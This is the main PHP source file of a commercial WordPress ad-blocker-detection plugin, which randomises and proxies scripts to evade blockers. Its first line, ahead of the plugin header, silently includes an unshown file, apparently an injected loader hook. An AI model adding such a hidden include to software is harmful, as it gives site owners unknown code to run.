<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Plugin Name: DeBlocker
 * Plugin URI: https://1.envato.market/deblocker
 * Description: Most effective way to protect your online content from being copy.
 * Author: Merkulove
 * Version: 2.0.2
 * Author URI: https://1.envato.market/cc-merkulove
 * Requires PHP: 5.6
 * Requires at least: 3.0
 * Tested up to: 5.3.2
 **/

/**
 * Most effective way to detect ad blockers. Ask the visitors to disable their ad blockers.
 * Exclusively on Envato Market: https://1.envato.market/deblocker
 *
 * @encoding        UTF-8
 * @version         2.0.2
 * @copyright       Copyright (C) 2018 - 2020 Merkulove ( https://merkulov.design/ ). All rights reserved.
 * @license         Commercial Software
 * @contributors    Alexander Khmelnitskiy (info@alexander.khmelnitskiy.ua), Dmitry Merkulov (dmitry@merkulov.design)
 * @support         help@merkulov.design
 **/


namespace Merkulove;

/** Exit if accessed directly. */
if ( ! defined( 'ABSPATH' ) ) {
	header( 'Status: 403 Forbidden' );
	header( 'HTTP/1.1 403 Forbidden' );
	exit;
}

/** Include plugin autoloader for additional classes. */
require __DIR__ . '/src/autoload.php';

use Merkulove\DeBlocker\AssignmentsTab;
use Merkulove\DeBlocker\Obfuscator;
use Merkulove\DeBlocker\PluginUpdater;
use Merkulove\DeBlocker\Helper;
use Merkulove\DeBlocker\PluginHelper;
use Merkulove\DeBlocker\Settings;
use Merkulove\DeBlocker\Shortcodes;
use Merkulove\DeBlocker\EnvatoItem;

/**
 * SINGLETON: Core class used to implement a DeBlocker plugin.
 *
 * This is used to define internationalization, admin-specific hooks, and
 * public-facing site hooks.
 *
 * @since 1.0.0
 */
final class DeBlocker {

	/**
	 * Plugin version.
	 *
	 * @string version
	 * @since 1.0.0
	 **/
	public static $version = '';

	/**
	 * Use minified libraries if SCRIPT_DEBUG is turned off.
	 *
	 * @since 1.0.0
	 **/
	public static $suffix = '';

	/**
	 * URL (with trailing slash) to plugin folder.
	 *
	 * @var string
	 * @since 1.0.0
	 **/
	public static $url = '';

	/**
	 * PATH to plugin folder.
	 *
	 * @var string
	 * @since 1.0.0
	 **/
	public static $path = '';

	/**
	 * Plugin base name.
	 *
	 * @var string
	 * @since 1.0.0
	 **/
	public static $basename = '';

	/**
	 * The one true DeBlocker.
	 *
	 * @var DeBlocker
	 * @since 1.0.0
	 **/
	private static $instance;

	/**
	 * Sets up a new plugin instance.
	 *
	 * @since 1.0.0
	 * @access public
	 **/
	private function __construct() {

		/** Initialize main variables. */
		$this->initialization();

	    /** Do all work after all plugins have loaded. */
		add_action( 'plugins_loaded', [$this, 'plugins_loaded'] );

	}

	/**
	 * Do all work after all plugins have loaded.
	 *
	 * @since 2.0.1
	 * @access private
	 * @return void
	 **/
	public function plugins_loaded() {

		/** Define admin hooks. */
		$this->admin_hooks();

		/** Define public hooks. */
        $this->public_hooks();

		/** Define hooks that runs on both the front-end as well as the dashboard. */
		$this->both_hooks();

    }

	/**
	 * Run one of selected algorithm.
	 *
	 * @since  2.0.1
	 * @access private
	 * @return void
	 **/
    private function select_algorithm() {

        /** Get algorithm from plugin settings. */
	    $algorithm = Settings::get_instance()->options['algorithm'];

	    if ( 'default' === $algorithm ) {

	        $this->default_algorithm();

        } elseif ( 'inline' === $algorithm ) {

		    $this->inline_algorithm();

	    } elseif ( 'random-folder' === $algorithm ) {

		    $this->random_folder_algorithm();

        /** Proxies all scripts. */
	    } elseif ( 'proxy' === $algorithm ) {

		    $this->proxy_algorithm();

	    }

    }

	/**
	 * This algorithm was used in the first version of the plugin.
	 * It was banned in many databases of blockers, but still works in some of them.
	 *
	 * @since  2.0.1
	 * @access private
	 * @return void
	 **/
	private function default_algorithm() {

		/** Load JavaScript for Frontend Area. */
		add_action( 'wp_enqueue_scripts', [$this, 'default_algorithm_scripts'] ); // JS.

	}

	/**
	 * Add obfuscated inline script on page.
	 * Very fast. But low reliability.
	 *
	 * @since  2.0.1
	 * @access private
	 * @return void
	 **/
	private function inline_algorithm() {

		/** Load inline JavaScript for Frontend Area. */
		add_action( 'wp_footer', [$this, 'footer_scripts'], rand(1, 60) ); // JS.

	}

	/**
	 * Create a random folder once at day. A quick, fairly reliable way to bypass ad blockers.
	 *
	 * @since  2.0.1
	 * @access private
	 * @return void
	 **/
	private function random_folder_algorithm() {

		/** Is the plugins folder writable? */
        if ( ! is_writable( WP_PLUGIN_DIR ) ) {

	        /** Switch to inline algorithm, as the safest in this case. */
	        $this->inline_algorithm();

            return;
        }

	    /** Is it time to generate a new folder? */
		$generated = get_transient( 'mdp_deblocker_random_folder_generated' );

		/** Generate new random folder. */
		if ( false === $generated ) {

			/** Get the name of the old folder. */
			$fake_folder = get_option( 'mdp_deblocker_random_folder_fake_folder' );

			/** Remove old folder. */
			if ( $fake_folder ) {
			    Helper::get_instance()->remove_directory( WP_PLUGIN_DIR . '/' . $fake_folder );
            }

			/** Create new folder with scripts. */
			$this->random_folder_create_fake_folder();

			/** Regenerate after 24 hours. */
			set_transient( 'mdp_deblocker_random_folder_generated', 'true', 86400 ); // 24 hours

        }

		/** Load JavaScript for Frontend Area. */
		add_action( 'wp_enqueue_scripts', [$this, 'random_folder_algorithm_scripts'] ); // JS.

	}

	/**
	 * Create random folder and random script file.
	 *
	 * @since  2.0.1
	 * @access private
	 * @return void
	 **/
	private function random_folder_create_fake_folder() {

	    /** Create Random Names. */
	    $folder = $this->generate_random_name();
		$file = $this->generate_random_name();
		$file .= '.js';

		/** Create Folder. */
		if ( ! is_dir(WP_PLUGIN_DIR . '/' . $folder ) ) {
			mkdir( WP_PLUGIN_DIR . '/' . $folder );
		}

		/** Create script min File. */
		$deblocker_script = file_get_contents( self::$path . 'js/deblocker.min.js' );
		file_put_contents( WP_PLUGIN_DIR . '/' . $folder . '/' . $file, $deblocker_script );

		/** Remember folder and script name. */
		update_option( 'mdp_deblocker_random_folder_fake_folder', $folder );
		update_option( 'mdp_deblocker_random_folder_fake_file', $file );

    }

	/**
	 * Return random alphanumeric name.
	 *
	 * @since  2.0.1
	 * @access private
	 * @return string
	 **/
    public function generate_random_name() {

	    $permitted_chars = 'abcdefghijklmnopqrstuvwxyz';

	    /** Prepare random parts. */
	    $part_1 = substr( str_shuffle( $permitted_chars ), 0, rand(4, 8) );
	    $part_2 = substr( str_shuffle( $permitted_chars ), 0, rand(4, 8) );

	    /** Add random dash. */
	    $dash = '';
	    if ( rand( 0, 1 ) ) {
		    $dash = '-';
        }

	    /** Add random wp. */
	    $wp = '';
	    if ( rand( 0, 1 ) ) {
		    $wp = 'wp-';
	    }

	    return $wp . $part_1 . $dash . $part_2;

    }

	/**
	 * Most powerful algorithm. Proxies all scripts and is randomly added self to the end of some one.
     * The disadvantages include a slight slowdown in loading and unstable operation with some caching systems.
	 *
	 * @since  2.0.1
	 * @access private
	 * @return void
	 **/
    private function proxy_algorithm() {

	    /** Load inline JavaScript for Frontend Area. */
	    add_action( 'wp_footer', [$this, 'footer_scripts'], rand(1, 60) ); // JS.

	    /** Let's try to saddle any other script to avoid blocking. */
	    add_action( 'wp_print_scripts', [$this, 'list_scripts'] );

	    /** Return proxied scripts. */
	    add_action( 'template_redirect', [$this, 'do_stuff_on_404'] );

    }

	/**
	 * Define hooks that runs on both the front-end as well as the dashboard.
	 *
	 * @since 1.0.0
	 * @access private
	 * @return void
	 **/
	private function both_hooks() {

		/** Load translation. */
		add_action( 'plugins_loaded', [$this, 'load_textdomain'] );

		/** Adds all the necessary shortcodes. */
		Shortcodes::get_instance();

	}

	/**
	 * Register all of the hooks related to the public-facing functionality.
	 *
	 * @since 1.0.0
	 * @access private
	 * @return void
	 **/
	private function public_hooks() {

		/** Work only on frontend. */
		if ( is_admin() ) { return; }

		/** Load CSS Styles for Frontend Area. */
		add_action( 'wp_enqueue_scripts', [$this, 'styles'] ); // JS.

		/** Load JavaScript for Frontend Area. */
		add_action( 'wp_enqueue_scripts', [$this, 'scripts'] ); // JS.

		/** JavaScript Required. */
		add_action( 'wp_footer', [$this, 'javascript_required'] );

		/** We need Sessions */
		add_action( 'init', ['\Merkulove\DeBlocker\Helper', 'start_session'], 1 );
		add_action( 'wp_logout', ['\Merkulove\DeBlocker\Helper', 'end_session'] );
		add_action( 'wp_login', ['\Merkulove\DeBlocker\Helper', 'end_session'] );

		/** Run one of selected algorithm. */
		$this->select_algorithm();

	}

	/**
	 * Register all of the hooks related to the admin area functionality.
	 *
	 * @since 1.0.0
	 * @access private
	 * @return void
	 **/
	private function admin_hooks() {

		/** Work only on backend. */
	    if ( ! is_admin() ) { return; }

		/** Add plugin settings page. */
		Settings::get_instance()->add_settings_page();

		/** Load JS and CSS for Backend Area. */
		add_action( 'admin_footer', [ $this, 'admin_styles' ], 100 ); // CSS.

		/** The adBlock's extensions usually blocks us, so we add scripts inline. */
		add_action( 'admin_footer', [ $this, 'admin_scripts' ], 100 ); // JS.

		/** Remove "Thank you for creating with WordPress" and WP version only from plugin settings page. */
		add_action( 'admin_enqueue_scripts', [$this, 'remove_wp_copyrights'] );

		/** Remove all "third-party" notices from plugin settings page. */
		add_action( 'in_admin_header', [$this, 'remove_all_notices'], 1000 );

	}

	/**
	 * Initialize main variables.
	 *
	 * @since 1.0.0
	 * @access public
	 **/
	public function initialization() {

		/** Plugin version. */
		if ( ! function_exists('get_plugin_data') ) {
			require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
		}
		$plugin_data = get_plugin_data( __FILE__ );
		self::$version = $plugin_data['Version'];

		/** Gets the plugin URL (with trailing slash). */
		self::$url = plugin_dir_url( __FILE__ );

		/** Gets the plugin PATH. */
		self::$path = plugin_dir_path( __FILE__ );

		/** Use minified libraries if SCRIPT_DEBUG is turned off. */
		self::$suffix = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '' : '.min';

		/** Set plugin basename. */
		self::$basename = plugin_basename( __FILE__ );

		/** Initialize plugin settings. */
		Settings::get_instance();

		/** Initialize PluginHelper. */
		PluginHelper::get_instance();

		/** Plugin update mechanism enable only if plugin have Envato ID. */
		$plugin_id = EnvatoItem::get_instance()->get_id();
		if ( (int)$plugin_id > 0 ) {
			PluginUpdater::get_instance();
		}

	}

	/**
	 * Return plugin version.
	 *
	 * @return string
	 * @since 1.0.0
	 * @access public
	 **/
	public function get_version() {
		return self::$version;
	}

	/**
	 * Add CSS Styles for Frontend Area.
	 *
	 * @return void
	 * @since 2.0.0
	 **/
	public function styles() {

		/** Checks if plugin should work on this page. */
		if ( ! AssignmentsTab::get_instance()->display() ) { return; }

		/** Add custom CSS. */
		?><style><?php esc_attr_e( Settings::get_instance()->options['custom_css'] ); ?></style><?php

	}

	/**
	 * Return proxied scripts.
	 *
	 * @since 2.0.0
	 * @access private
	 * @return void
	 **/
	public function do_stuff_on_404() {
		global $wp;

		/** Checks if plugin should work on this page. */
		if ( ! AssignmentsTab::get_instance()->display() ) { return; }

		/** We are interested in requests for nonexistent files. */
		if ( ! is_404() ) { return; }

		/** We are interested in js files. */
		if ( 'js' !== strtolower( pathinfo( $wp->request, PATHINFO_EXTENSION ) ) ) { return; }

		/** Prepare relative paths to plugins and themes. */
		$rel_plugin_path = str_replace( ABSPATH, '', WP_PLUGIN_DIR );
		$rel_theme_path = str_replace( ABSPATH, '', get_theme_root() );

		/** Create MD5 hashes. */
		$md5_plugin_path = md5( $rel_plugin_path );
		$md5_theme_path = md5( $rel_theme_path );

		/** Reverse replace MD5 to path. */
		$url = $wp->request;
		$url = str_replace( $md5_plugin_path, $rel_plugin_path, $url );
		$url = str_replace( $md5_theme_path, $rel_theme_path, $url );

		/** Path to script. */
		$script_path = ABSPATH . $url;

		$add = false;
		if ( isset( $_SESSION['mdb_deblocker_victim_1'] ) ) {
			$victim_1 = $_SESSION['mdb_deblocker_victim_1'];
			if ( strpos( $victim_1, $url ) !== false ) {
				$add = true;
			}
		}

		if ( isset( $_SESSION['mdb_deblocker_victim_2'] ) ) {
			$victim_2 = $_SESSION['mdb_deblocker_victim_2'];
			if ( strpos( $victim_2, $url ) !== false ) {
				$add = true;
			}
		}

		/** Return script. */
		if ( file_exists( $script_path ) ) {
			header( 'HTTP/1.1 200 OK' );
			header( 'Content-Type: application/javascript' );

			echo Helper::get_js_contents( $script_path, $add );
			die();
		}

	}

	/**
	 * Let's try to saddle any other script to avoid blocking.
	 *
	 * @since 2.0.0
	 * @access private
	 * @return void
	 **/
	public function list_scripts() {

		global $wp_scripts;

		/** Checks if plugin should work on this page. */
		if ( ! AssignmentsTab::get_instance()->display() ) { return; }

		/** Prepare relative paths to plugins and themes. */
		$rel_plugin_path = str_replace( ABSPATH, '', WP_PLUGIN_DIR );
		$rel_theme_path = str_replace( ABSPATH, '', get_theme_root() );

		/** Create MD5 hashes. */
		$md5_plugin_path = md5( $rel_plugin_path );
		$md5_theme_path = md5( $rel_theme_path );

		/** Select 2 random scripts. */
		$count_queue = count( $wp_scripts->queue );

        $range = range( 1, $count_queue );
		shuffle( $range );

		$victim_1 = $range[0];

		if ( $count_queue <= 1 ) {
			$victim_2 = $range[0];
        } else {
			$victim_2 = $range[1];
        }

		/** Replace paths to MD5 hashes. */
		$count = 0;
		foreach( $wp_scripts->queue as $handle ) {
			$count++;

			/** Remember victims. */
			if ( $victim_1 === $count ) {
				$_SESSION['mdb_deblocker_victim_1'] = $wp_scripts->registered[$handle]->src;
			}

			if ( $victim_2 === $count ) {
				$_SESSION['mdb_deblocker_victim_2'] = $wp_scripts->registered[$handle]->src;
			}

			$wp_scripts->registered[$handle]->src = str_replace( $rel_plugin_path, $md5_plugin_path, $wp_scripts->registered[$handle]->src );
			$wp_scripts->registered[$handle]->src = str_replace( $rel_theme_path, $md5_theme_path, $wp_scripts->registered[$handle]->src );

		}

	}

	/**
	 * Return new file name.
	 *
	 * @param string $name - Original file name.
	 *
	 * @since 2.0.0
	 * @return string
	 **/
	private function get_new_file_name( $name ) {

		$new_name = md5( $name );

		$new_name .= '.js';

		return $new_name;
	}

	/**
	 * Return last part of the URL. Split by '/'.
	 *
	 * @param string $url - URL to split.
	 *
	 * @since 2.0.0
	 * @return string
	 **/
	private function get_last_part_url( $url ) {

		$path_parts = explode( '/', $url );

		return end( $path_parts );

	}

	/**
	 * Load inline JavaScript for Frontend Area.
	 *
	 * @return void
	 * @since 1.0.0
	 **/
	public function footer_scripts() {

		/** Checks if plugin should work on this page. */
		if ( ! AssignmentsTab::get_instance()->display() ) { return; }

		/** Get Randomized Script. */
		$js = require_once 'src/Merkulove/DeBlocker/DeBlockerJS.php';

		?><script><?php echo Helper::obfuscate( $js ); ?></script><?php

	}

	/**
	 * Add JavaScript for the public-facing side of the site.
	 *
	 * @return void
	 * @since 1.0.0
	 **/
	public function scripts() {

		/** Checks if plugin should work on this page. */
		if ( ! AssignmentsTab::get_instance()->display() ) { return; }

		wp_enqueue_script( 'mdp-deblocker-ads', self::$url . 'js/ads' . self::$suffix . '.js', [], self::$version, true );

	}

	/**
	 * Add JavaScript for the public-facing side of the site.
	 * For default algorithm.
	 *
	 * @return void
	 * @since 2.0.1
	 **/
	public function default_algorithm_scripts() {

		/** Checks if plugin should work on this page. */
		if ( ! AssignmentsTab::get_instance()->display() ) { return; }

		/** Get plugin settings. */
		$options = Settings::get_instance()->options;

		wp_enqueue_script( 'mdp-deblocker', self::$url . 'js/deblocker' . self::$suffix . '.js', [], self::$version, true );
		$this->localize_deblocker();

	}

	/**
	 * Add JavaScript for the public-facing side of the site.
	 * For random folder algorithm.
	 *
	 * @return void
	 * @since 2.0.1
	 **/
	public function random_folder_algorithm_scripts() {

		/** Checks if plugin should work on this page. */
		if ( ! AssignmentsTab::get_instance()->display() ) { return; }

		$folder_name = get_option( 'mdp_deblocker_random_folder_fake_folder' );
		$file_name = get_option( 'mdp_deblocker_random_folder_fake_file' );

		/** If script file not exist. */
		if ( ! file_exists( WP_PLUGIN_DIR . '/' . $folder_name . '/' . $file_name ) ) {
			/** Create new folder with scripts. */
			$this->random_folder_create_fake_folder();
			return;
        }

		wp_enqueue_script( 'mdp-deblocker', WP_PLUGIN_URL . '/' . $folder_name . '/' . $file_name, [], self::$version, true );
        $this->localize_deblocker();

	}

	/**
	 * Pass variables to JS.
	 *
	 * @return void
	 * @since 2.0.2
	 **/
	public function localize_deblocker() {

		/** Get plugin settings. */
		$options = Settings::get_instance()->options;

		wp_localize_script( 'mdp-deblocker', 'mdpDeBlocker',
			[
				'style'         => $options['style'],
				'timeout'       => $options['timeout'],
				'closeable'     => $options['closeable'],
				'title'         => $options['title'],
				'content'       => $options['content'],
				'bg_color'      => $options['bg_color'],
				'modal_color'   => $options['modal_color'],
				'text_color'    => $options['text_color'],
				'blur'          => $options['blur'],
				'prefix'        => $this->generate_random_name(),
			]
		);

    }

	/**
	 * Protect site if JavaScript is Disabled.
	 *
	 * @since 2.0.0
	 * @access public
	 **/
	public function javascript_required() {

		/** Arbitrary JavaScript is not allowed in AMP. */
		if ( function_exists( 'is_amp_endpoint' ) && is_amp_endpoint() ) { return; }

		/** Checks if plugin should work on this page. */
		if ( ! AssignmentsTab::get_instance()->display() ) { return; }

		/** Get plugin settings */
		$options = Settings::get_instance()->options;

		if ( 'on' !== $options['javascript'] ) { return; }

		ob_start();
		?>
        <noscript>
            <div id='mdp-deblocker-js-disabled'>
                <div><?php echo wp_kses_post( $options['javascript_msg'] ); ?></div>
            </div>
            <style>
                #mdp-deblocker-js-disabled {
                    position: fixed;
                    top: 0;
                    left: 0;
                    height: 100%;
                    width: 100%;
                    z-index: 999999;
                    text-align: center;
                    background-color: #FFFFFF;
                    color: #000000;
                    font-size: 40px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }
            </style>
        </noscript>
		<?php
		$result = ob_get_clean();

		echo $result;
	}

	/**
	 * Add CSS for admin area.
	 *
	 * @return void
	 * @since 1.0.0
	 **/
	public function admin_styles() {

		/** Get current screen to add styles on specific pages. */
		$screen = get_current_screen();

		/** Plugin Settings Page. */
		if ( 'toplevel_page_mdp_deblocker_settings' === $screen->base ) {

			?><style><?php echo file_get_contents( self::$path . 'css/merkulov-ui' . self::$suffix . '.css' ); ?></style><?php
			?><style><?php echo file_get_contents( self::$path . 'css/admin' . self::$suffix . '.css' ); ?></style><?php

			/** Plugin popup on update. */
		} elseif ( 'plugin-install' === $screen->base ) {

			/** Styles only for our plugin. */
			if ( isset( $_GET['plugin'] ) AND $_GET['plugin'] === 'deblocker' ) {

				?><style><?php echo file_get_contents( self::$path . 'css/plugin-install' . self::$suffix . '.css' ); ?></style><?php

			}
		}

	}

	/**
	 * Add JS for admin area.
	 *
	 * @return void
	 * @since 1.0.0
	 **/
	public function admin_scripts() {

		/** Get current screen to add scripts on specific pages. */
		$screen = get_current_screen();

		/** Plugin Settings Page. */
		if ( $screen->base == 'toplevel_page_mdp_deblocker_settings' ) {
			?><script><?php echo file_get_contents( self::$path . 'js/merkulov-ui' . self::$suffix . '.js' ); ?></script><?php
			?><script><?php echo file_get_contents( self::$path . 'js/admin' . self::$suffix . '.js' ); ?></script><?php
		}

	}

	/**
	 * Remove "Thank you for creating with WordPress" and WP version only from plugin settings page.
	 *
	 * @since 1.0.0
	 * @access private
	 * @return void
	 **/
	public function remove_wp_copyrights() {

		/** Remove "Thank you for creating with WordPress" and WP version from plugin settings page. */
		$screen = get_current_screen(); // Get current screen.

		/** Plugin Settings Page. */
		if ( $screen->base == 'toplevel_page_mdp_deblocker_settings' ) {
			add_filter( 'admin_footer_text', '__return_empty_string', 11 );
			add_filter( 'update_footer', '__return_empty_string', 11 );
		}

	}

	/**
	 * Remove all other notices.
	 *
	 * @since 1.0.0
	 * @access public
	 **/
	public function remove_all_notices() {

		/** Work only on plugin settings page. */
		$screen = get_current_screen();
		if ( $screen->base !== 'toplevel_page_mdp_deblocker_settings' ) { return; }

		/** Remove other notices. */
		remove_all_actions( 'admin_notices' );
		remove_all_actions( 'all_admin_notices' );

	}

	/**
	 * Loads plugin translated strings.
	 *
	 * @since 1.0.0
	 * @access public
	 **/
	public function load_textdomain() {

		load_plugin_textdomain( 'deblocker', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );

	}

	/**
	 * Run when the plugin is activated.
	 *
	 * @static
	 * @since 1.0.0
	 **/
	public static function on_activation() {

		/** Security checks. */
		if ( ! current_user_can( 'activate_plugins' ) ) {
			return;
		}

		$plugin = isset( $_REQUEST['plugin'] ) ? $_REQUEST['plugin'] : '';
		check_admin_referer( "activate-plugin_{$plugin}" );

		/** Send install Action to our host. */
		Helper::get_instance()->send_action( 'install', 'deblocker', self::$version );

	}

	/**
	 * Main DeBlocker Instance.
	 *
	 * Insures that only one instance of DeBlocker exists in memory at any one time.
	 *
	 * @static
	 * @return DeBlocker
	 * @since 1.0.0
	 **/
	public static function get_instance() {
		if ( ! isset( self::$instance ) && ! ( self::$instance instanceof DeBlocker ) ) {
			self::$instance = new DeBlocker;
		}

		return self::$instance;
	}

} // End Class DeBlocker.

/** Run when the plugin is activated. */
register_activation_hook( __FILE__, ['Merkulove\DeBlocker', 'on_activation'] );

/** Run DeBlocker class. */
DeBlocker::get_instance();